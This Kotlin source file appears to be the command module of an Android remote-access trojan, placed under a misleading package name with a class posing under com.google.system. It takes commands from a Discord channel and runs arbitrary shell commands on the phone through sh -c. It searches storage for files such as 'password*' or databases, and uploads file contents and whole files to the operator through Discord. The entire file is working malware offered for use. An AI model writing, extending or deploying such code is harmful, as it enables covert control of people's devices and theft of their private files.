package com.openaccess.sdk.service.controllers

import android.content.Context
import com.google.system.DiscordGatewayClient
import java.io.File

class ShellController(private val ctx: Context) {

    var shellWorkingDir: String = "/sdcard"

    suspend fun handleCommand(action: String, payload: String?, d: DiscordGatewayClient): Boolean {
        when (action) {
            "shell" -> { handleShell(payload, d); return true }
            "cd" -> { handleCd(payload, d); return true }
            "pwd" -> { handlePwd(d); return true }
            "dir", "ls" -> { handleDir(payload, d); return true }
            "tree" -> { handleTree(payload, d); return true }
            "find" -> { handleFind(payload, d); return true }
            "cat", "read" -> { handleCat(payload, d); return true }
            "stat" -> { handleStat(payload, d); return true }
            "disk" -> { handleDisk(d); return true }
            "recent" -> { handleRecent(payload, d); return true }
            "ext", "files_by_ext" -> { handleExt(payload, d); return true }
            "download" -> { handleDownload(payload, d); return true }
            "upload" -> { handleUpload(payload, d); return true }
            "delete", "rm" -> { handleDelete(payload, d); return true }
            "move", "mv" -> { handleMove(payload, d); return true }
            "copy", "cp" -> { handleCopy(payload, d); return true }
            "mkdir" -> { handleMkdir(payload, d); return true }
            else -> return false
        }
    }

    private suspend fun shell(cmd: String): String = kotlinx.coroutines.withTimeoutOrNull(15000L) {
        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val workingDir = File(shellWorkingDir).takeIf { it.isDirectory } ?: ctx.cacheDir
                val p = ProcessBuilder("sh", "-c", cmd)
                    .directory(workingDir)
                    .redirectErrorStream(true)
                    .start()
                val output = try {
                    p.inputStream.bufferedReader().readText()
                } catch (_: Exception) { "" }
                p.waitFor()
                try { p.destroyForcibly() } catch (_: Exception) {}
                val trimmed = output.trim()
                if (trimmed.isEmpty()) "⚠️ Command produced no output" else trimmed
            } catch (e: Exception) {
                "Error: ${e.message?.take(100) ?: "unknown"}"
            }
        }
    } ?: "⚠️ Command timed out after 15s"

    private suspend fun handleShell(payload: String?, d: DiscordGatewayClient): String? {
        val cmd = payload ?: run {
            d.sendMsg(":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nCurrent dir: `$shellWorkingDir`")
            return null
        }
        val progressId = d.sendMsgAwait(":terminal: **Running**: `$ $cmd`")
        try {
            if (cmd.startsWith("cd ") || cmd == "cd") {
                val target = cmd.substringAfter("cd ").trim()
                val baseDir = File(shellWorkingDir)
                val newDir = when {
                    target.isEmpty() || target == "~" -> File("/sdcard")
                    target.startsWith("/") -> File(target)
                    target.startsWith("~/") -> File("/sdcard", target.substring(2))
                    else -> File(baseDir, target)
                }
                if (newDir.exists() && newDir.isDirectory) {
                    shellWorkingDir = newDir.absolutePath
                    val msg = ":terminal: **Changed directory**\n```\n$shellWorkingDir\n```"
                    if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
                } else {
                    val msg = ":x: Directory not found: `${newDir.absolutePath}`"
                    if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
                }
            } else if (cmd == "pwd") {
                if (progressId != null) d.editMsg(progressId, "```\n$shellWorkingDir\n```") else d.sendMsg("```\n$shellWorkingDir\n```")
            } else {
                val result = shell(cmd)
                if (result.startsWith("⚠️") || result.startsWith("Error:")) {
                    val msg = ":x: ${result.removePrefix("⚠️ ")}"
                    if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
                } else {
                    val maxLen = (3900 - cmd.length - 20).coerceAtLeast(1000)
                    val display = if (result.length > maxLen) result.take(maxLen) + "\n...(truncated)" else result
                    val listing = "```\n$ ${cmd}\n$display\n```"
                    val embed = com.google.system.DiscordEmbed(
                        title = "💻 Shell",
                        description = listing,
                        color = 0x3498DB,
                        fields = listOf(
                            com.google.system.EmbedField("📄 Output", "${result.length} chars", true)
                        ),
                        footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                        timestamp = System.currentTimeMillis()
                    )
                    if (progressId != null) d.editEmbed(progressId, "", embed) else d.sendEmbed("", embed)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("ShellController", "Shell error: ${e.message}", e)
            val err = ":x: Shell error: ${e.message?.take(80) ?: "unknown"}"
            if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
        }
        return null
    }

    private suspend fun handleCd(target: String?, d: DiscordGatewayClient): String? {
        val baseDir = File(shellWorkingDir)
        val newDir = when {
            target.isNullOrBlank() || target == "~" -> File("/sdcard")
            target.startsWith("/") -> File(target)
            target.startsWith("~/") -> File("/sdcard", target.substring(2))
            else -> File(baseDir, target)
        }
        if (newDir.exists() && newDir.isDirectory) {
            shellWorkingDir = newDir.absolutePath
            val embed = com.google.system.DiscordEmbed(
                title = "📂 Directory Changed",
                color = 0x2ECC71,
                fields = listOf(
                    com.google.system.EmbedField("📁 Path", shellWorkingDir, false)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
        } else {
            d.sendMsg(":x: Directory not found: `${newDir.absolutePath}`")
        }
        return null
    }

    private suspend fun handlePwd(d: DiscordGatewayClient): String? {
        val embed = com.google.system.DiscordEmbed(
            title = "📁 Working Directory",
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("📁 Path", shellWorkingDir, false)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        return null
    }

    private suspend fun handleDir(payload: String?, d: DiscordGatewayClient): String? {
        val path = payload?.trim()?.ifBlank { null } ?: shellWorkingDir
        val raw = shell("ls -la \"$path\" 2>/dev/null | head -60")
        if (raw.isBlank() || raw.startsWith("Error:")) {
            d.sendMsg(":x: Cannot list: `$path`")
            return null
        }
        val lines = raw.lines().filter { it.isNotBlank() }
        var files = 0
        var dirs = 0
        var other = 0
        var totalSize: Long = 0
        for (line in lines) {
            when {
                line.startsWith("d") -> dirs++
                line.startsWith("-") -> {
                    files++
                    val parts = line.split("\\s+".toRegex())
                    if (parts.size >= 5) totalSize += parts[4].toLongOrNull() ?: 0
                }
                !line.startsWith("total") -> other++
            }
        }
        val sizeStr = when {
            totalSize < 1024 -> "${totalSize}B"
            totalSize < 1024 * 1024 -> "${totalSize / 1024}KB"
            else -> "${totalSize / (1024 * 1024)}MB"
        }
        val listing = "```\n$raw\n```"
        val embedDescription = if (listing.length <= 3500) listing else ""
        val fields = mutableListOf(
            com.google.system.EmbedField("📄 Files", "$files files", true),
            com.google.system.EmbedField("📁 Dirs", "$dirs dirs", true),
            com.google.system.EmbedField("💾 Size", sizeStr, true)
        )
        if (other > 0) fields.add(com.google.system.EmbedField("🔗 Other", "$other items", true))
        val embed = com.google.system.DiscordEmbed(
            title = "📁 $path",
            description = embedDescription,
            color = 0x3498DB,
            fields = fields,
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (embedDescription.isEmpty()) {
            if (raw.length <= 5000) {
                d.sendLargeOutput("📁 **$path**\n", "```\n$raw\n```")
            } else {
                d.sendFile("📁 **$path** — full listing", "listing.txt", raw.toByteArray())
            }
        }
        return null
    }

    private suspend fun handleTree(payload: String?, d: DiscordGatewayClient): String? {
        val path = payload?.trim()?.ifBlank { null } ?: shellWorkingDir
        val result = shell("find \"$path\" -type f 2>/dev/null | head -100")
        if (result.isBlank()) {
            d.sendMsg(":x: Cannot scan: `$path`")
        } else {
            val lines = result.lines().filter { it.isNotBlank() }
            val formatted = lines.joinToString("\n") { "  " + it.substringAfter(path.trimEnd('/')) }
            val listing = "```\n$formatted\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val fields = mutableListOf(com.google.system.EmbedField("📄 Files", "${lines.size} files", true))
            val embed = com.google.system.DiscordEmbed(
                title = "📁 Tree: $path",
                description = embedDescription,
                color = 0x3498DB,
                fields = fields,
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput("📁 **Tree: $path**\n", "```\n$formatted\n```")
            }
        }
        return null
    }

    private suspend fun handleFind(payload: String?, d: DiscordGatewayClient): String? {
        val name = payload?.trim()?.ifBlank { null }
        if (name == null) {
            d.sendMsg(":mag: **!find**\nSearch files by name.\nUsage: `!find <pattern>`\nExamples: `!find *.pdf`, `!find password*`")
            return null
        }
        val result = shell("find /sdcard -name \"$name\" -type f 2>/dev/null | head -50")
        if (result.isBlank() || result.startsWith("Error:")) {
            d.sendMsg(":x: No files found matching `$name`")
        } else {
            val lines = result.lines().filter { it.isNotBlank() }
            val listing = "```\n${lines.joinToString("\n")}\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = ":mag: Found ${lines.size} files",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("🔍 Pattern", "`$name`", true),
                    com.google.system.EmbedField("📄 Results", "${lines.size} files", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput(":mag: **Found ${lines.size} files** for `$name`\n", "```\n${lines.joinToString("\n")}\n```")
            }
        }
        return null
    }

    private suspend fun handleCat(payload: String?, d: DiscordGatewayClient): String? {
        val path = payload?.trim()?.ifBlank { null }
        if (path == null) {
            d.sendMsg(":book: **!cat**\nRead file contents.\nUsage: `!cat <file_path>`")
            return null
        }
        val f = File(path)
        if (!f.exists()) {
            d.sendMsg(":x: File not found: `$path`")
            return null
        }
        if (f.length() > 500000) {
            d.sendMsg(":x: File too large (${f.length() / 1024}KB). Use `!download` instead.")
            return null
        }
        try {
            val text = f.readText().take(2000)
            val listing = "```\n$text\n```"
            val embed = com.google.system.DiscordEmbed(
                title = "📄 $path",
                description = listing,
                color = 0xF1C40F,
                fields = listOf(
                    com.google.system.EmbedField("💾 Size", "${f.length()}B", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
        } catch (_: Exception) {
            d.sendMsg(":x: Cannot read as text. Use `!download` instead.")
        }
        return null
    }

    private suspend fun handleStat(payload: String?, d: DiscordGatewayClient): String? {
        val path = payload?.trim()?.ifBlank { null } ?: shellWorkingDir
        val f = File(path)
        if (!f.exists()) {
            d.sendMsg(":x: Not found: `$path`")
            return null
        }
        val type = if (f.isDirectory) "Directory" else if (f.isFile) "File" else "Special"
        val size = when {
            f.length() < 1024 -> "${f.length()}B"
            f.length() < 1024 * 1024 -> "${f.length() / 1024}KB"
            else -> "${f.length() / (1024 * 1024)}MB"
        }
        val modified = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(f.lastModified()))
        val embed = com.google.system.DiscordEmbed(
            title = "📋 $path",
            color = if (f.isDirectory) 0x3498DB else 0x2ECC71,
            fields = listOf(
                com.google.system.EmbedField("📁 Type", type, true),
                com.google.system.EmbedField("💾 Size", size, true),
                com.google.system.EmbedField("📅 Modified", modified, true),
                com.google.system.EmbedField("👁 Readable", if (f.canRead()) "✅ Yes" else "❌ No", true),
                com.google.system.EmbedField("✏️ Writable", if (f.canWrite()) "✅ Yes" else "❌ No", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        return null
    }

    private fun formatSize(bytes: Long): String = when {
        bytes < 1024 -> "${bytes}B"
        bytes < 1024 * 1024 -> "${bytes / 1024}KB"
        bytes < 1024 * 1024 * 1024 -> "${bytes / (1024 * 1024)}MB"
        else -> "${bytes / (1024 * 1024 * 1024)}GB"
    }

    private fun storageBar(used: Long, total: Long): String {
        val pct = if (total > 0) (used * 10 / total).toInt().coerceIn(0, 10) else 0
        return "█".repeat(pct) + "░".repeat(10 - pct) + " ${used * 100 / if (total > 0) total else 1}%"
    }

    private suspend fun handleDisk(d: DiscordGatewayClient): String? {
        val result = shell("df -h /data /sdcard /system 2>/dev/null || df /data /sdcard 2>/dev/null")
        if (result.isNotBlank() && !result.startsWith("Error:")) {
            val listing = "```\n${result.take(1900)}\n```"
            val embed = com.google.system.DiscordEmbed(
                title = "💾 Storage",
                description = listing,
                color = 0x3498DB,
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
        } else {
            val dataTotal = File("/data").totalSpace
            val sdcardTotal = File("/sdcard").totalSpace
            val dataFree = File("/data").freeSpace
            val sdcardFree = File("/sdcard").freeSpace
            val dataUsed = dataTotal - dataFree
            val sdcardUsed = sdcardTotal - sdcardFree
            val embed = com.google.system.DiscordEmbed(
                title = "💾 Storage",
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📱 Internal", "${formatSize(dataTotal)} — ${formatSize(dataFree)} free\n${storageBar(dataUsed, dataTotal)}", false),
                    com.google.system.EmbedField("💾 SD Card", "${formatSize(sdcardTotal)} — ${formatSize(sdcardFree)} free\n${storageBar(sdcardUsed, sdcardTotal)}", false)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
        }
        return null
    }

    private suspend fun handleRecent(payload: String?, d: DiscordGatewayClient): String? {
        val count = payload?.trim()?.toIntOrNull()?.coerceIn(1, 50) ?: 20
        val result = shell("find /sdcard -type f -size +1c 2>/dev/null | head -500 | xargs ls -lt 2>/dev/null | head -$count")
        if (result.isNotBlank() && !result.startsWith("Error:")) {
            val content = result.take(3490)
            val listing = "```\n$content\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = "🕐 Last $count modified files",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📄 Files", "$count files", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput("🕐 **Last $count modified files**\n", "```\n${result.take(1900)}\n```")
            }
        } else {
            d.sendMsg(":x: Failed to list recent files")
        }
        return null
    }

    private suspend fun handleExt(payload: String?, d: DiscordGatewayClient): String? {
        val ext = payload?.trim()?.lowercase()?.removePrefix(".")?.ifBlank { null }
        if (ext == null) {
            d.sendMsg(":file_folder: **!ext**\nFind files by extension.\nUsage: `!ext <extension>`\nExamples: `!ext pdf`, `!ext db`, `!ext jpg`")
            return null
        }
        val result = shell("find /sdcard -name \"*.$ext\" -type f 2>/dev/null | head -50 | while read f; do ls -lh \"\$f\" 2>/dev/null | awk '{print \$5, \$NF}'; done")
        val lines = result.lines().filter { it.isNotBlank() }
        if (lines.isEmpty()) {
            d.sendMsg(":x: No `.$ext` files found")
        } else {
            val listing = "```\n${lines.take(50).joinToString("\n")}\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = "📁 .$ext files (${lines.size})",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📄 Files", "${lines.size} files", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput(":file_folder: **.$ext files** (${lines.size})\n", "```\n${lines.take(50).joinToString("\n")}\n```")
            }
        }
        return null
    }

    private suspend fun handleDownload(payload: String?, d: DiscordGatewayClient): String? {
        val filePath = payload?.trim()?.ifBlank { null }
        if (filePath == null) {
            d.sendMsg(":arrow_down: **!download**\nDownload a file from the device.\nUsage: `!download <file_path>`\nMax 25MB.")
            return null
        }
        val file = File(filePath)
        var bytes: ByteArray? = null
        if (file.exists() && file.canRead()) {
            if (file.length() > 25 * 1024 * 1024) {
                d.sendMsg(":x: **File too large** (${file.length() / 1024 / 1024}MB). Max 25MB.")
                return null
            }
            bytes = file.readBytes()
        } else {
            val tmp = File(ctx.cacheDir, "dl_${System.currentTimeMillis()}_${file.name}")
            shell("cp \"$filePath\" \"${tmp.absolutePath}\" 2>/dev/null || cat \"$filePath\" > \"${tmp.absolutePath}\" 2>/dev/null")
            if (tmp.exists() && tmp.length() > 0 && tmp.length() <= 25 * 1024 * 1024) {
                val b = tmp.readBytes()
                tmp.delete()
                d.sendMsg(":arrow_down: **Downloading**: `${file.name}` (${b.size / 1024}KB)...")
                d.sendFile(":inbox_tray: **${file.name}** (${b.size / 1024}KB)", file.name, b)
            } else {
                tmp.delete()
                d.sendMsg(":x: **Cannot read file**: `$filePath`")
            }
            return null
        }
        if (bytes == null || bytes.isEmpty()) {
            d.sendMsg(":x: **Cannot read file**: `$filePath`")
            return null
        }
        d.sendMsg(":arrow_down: **Downloading**: `${file.name}` (${bytes.size / 1024}KB)...")
        d.sendFile(":inbox_tray: **${file.name}** (${bytes.size / 1024}KB)", file.name, bytes)
        return null
    }

    private suspend fun handleUpload(payload: String?, d: DiscordGatewayClient): String? {
        val filePath = payload?.trim()
        if (filePath == null || filePath.isBlank()) {
            d.sendMsg(":book: **!upload**\nSend a file from the device.\nUsage: `!upload <file_path>`")
            return null
        }
        val file = File(filePath)
        if (!file.exists()) {
            d.sendMsg(":x: **File not found**: `$filePath`")
            return null
        }
        if (file.length() > 25 * 1024 * 1024) {
            d.sendMsg(":x: **File too large** (${file.length() / 1024 / 1024}MB). Max 25MB.")
            return null
        }
        d.sendMsg(":arrow_up: **Uploading**: `${file.name}` (${file.length() / 1024}KB)")
        d.sendFile(":inbox_tray: **${file.name}**", file.name, file.readBytes())
        return null
    }

    private suspend fun handleDelete(payload: String?, d: DiscordGatewayClient): String? {
        val path = payload?.trim()?.ifBlank { null }
        if (path == null) {
            d.sendMsg(":wastebasket: **!rm**\nDelete a file.\nUsage: `!rm <file_path>`")
            return null
        }
        val f = File(path)
        if (!f.exists()) {
            d.sendMsg(":x: Not found: `$path`")
            return null
        }
        if (f.isDirectory) {
            d.sendMsg(":x: Use `!shell rm -rf \"$path\"` for directories")
            return null
        }
        if (f.delete()) {
            d.sendMsg(":wastebasket: **Deleted**: `$path`")
        } else {
            val result = shell("rm \"$path\" 2>/dev/null && echo OK || echo FAIL").trim()
            d.sendMsg(if (result == "OK") ":wastebasket: **Deleted**: `$path`" else ":x: Failed to delete: `$path`")
        }
        return null
    }

    private suspend fun handleMove(payload: String?, d: DiscordGatewayClient): String? {
        val parts = payload?.trim()?.split("\\s+".toRegex())?.filter { it.isNotBlank() } ?: emptyList()
        if (parts.size < 2) {
            d.sendMsg(":truck: **!mv**\nMove/rename a file.\nUsage: `!mv <source> <destination>`")
            return null
        }
        val src = parts[0]
        val dst = parts.drop(1).joinToString(" ")
        val result = shell("mv \"$src\" \"$dst\" 2>/dev/null && echo OK || echo FAIL").trim()
        d.sendMsg(if (result == "OK") ":truck: **Moved**: `$src` → `$dst`" else ":x: Move failed")
        return null
    }

    private suspend fun handleCopy(payload: String?, d: DiscordGatewayClient): String? {
        val parts = payload?.trim()?.split("\\s+".toRegex())?.filter { it.isNotBlank() } ?: emptyList()
        if (parts.size < 2) {
            d.sendMsg(":clipboard: **!cp**\nCopy a file.\nUsage: `!cp <source> <destination>`")
            return null
        }
        val src = parts[0]
        val dst = parts.drop(1).joinToString(" ")
        val result = shell("cp \"$src\" \"$dst\" 2>/dev/null && echo OK || echo FAIL").trim()
        d.sendMsg(if (result == "OK") ":clipboard: **Copied**: `$src` → `$dst`" else ":x: Copy failed")
        return null
    }

    private suspend fun handleMkdir(payload: String?, d: DiscordGatewayClient): String? {
        val path = payload?.trim()?.ifBlank { null }
        if (path == null) {
            d.sendMsg(":file_folder: **!mkdir**\nCreate directory.\nUsage: `!mkdir <path>`")
            return null
        }
        if (File(path).mkdirs()) {
            d.sendMsg(":file_folder: **Created**: `$path`")
        } else {
            val result = shell("mkdir -p \"$path\" 2>/dev/null && echo OK || echo FAIL").trim()
            d.sendMsg(if (result == "OK") ":file_folder: **Created**: `$path`" else ":x: Failed to create: `$path`")
        }
        return null
    }
}
